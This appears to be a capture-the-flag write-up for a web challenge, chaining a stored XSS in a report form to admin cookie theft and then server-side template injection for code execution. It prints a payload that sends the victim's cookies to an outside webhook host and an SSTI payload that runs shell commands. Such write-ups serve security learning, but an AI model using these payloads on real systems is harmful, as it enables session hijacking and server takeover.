---
title: "HackToday CTF 2024 — Web Challenge: XSS to RCE"
date: "2024-11-15"
tags: ["Web Exploitation", "XSS", "CTF"]
category: "CTF Write-up"
event: "HackToday CTF 2024"
difficulty: "Hard"
excerpt: "A complex chain starting from a stored XSS vulnerability that escalated to RCE through a misconfigured admin panel."
---

# HackToday CTF 2024 — XSS to RCE

## Challenge Overview

This challenge presented us with a web application that allowed users to submit reports. The goal was to steal admin cookies and leverage them to achieve Remote Code Execution.

**Points:** 500  
**Solves:** 12  
**Category:** Web Exploitation

## Reconnaissance

Starting with basic enumeration, I found:

```
GET /api/reports HTTP/1.1
Host: challenge.hacktoday.ctf
```

The response revealed an admin panel at `/secret-admin/` that was protected by a session cookie.

## Exploitation

### Step 1: Finding the XSS

The report submission form didn't properly sanitize the `name` field:

```javascript
// Vulnerable code
document.innerHTML = `<b>Report by: ${username}</b>`;
```

Crafted payload:
```html
<img src=x onerror="fetch('https://webhook.site/xxxx?c='+document.cookie)">
```

### Step 2: Cookie Stealing

After submitting the payload, waited for the admin bot to review. Got the admin session token:

```
admin_session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Step 3: From Admin to RCE

The admin panel had a template rendering feature that was vulnerable to SSTI:

```python
# Found in /admin/preview endpoint
template = Template(user_input)
result = template.render()
```

Final payload:
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## Flag

```
HTB{xss_ch41n_t0_rce_15_cr4zy_r1ght}
```

## Takeaways

- Always sanitize user input on the server side, not just the client
- SSTI can be devastating in admin contexts
- Chaining vulnerabilities often leads to higher-impact exploits
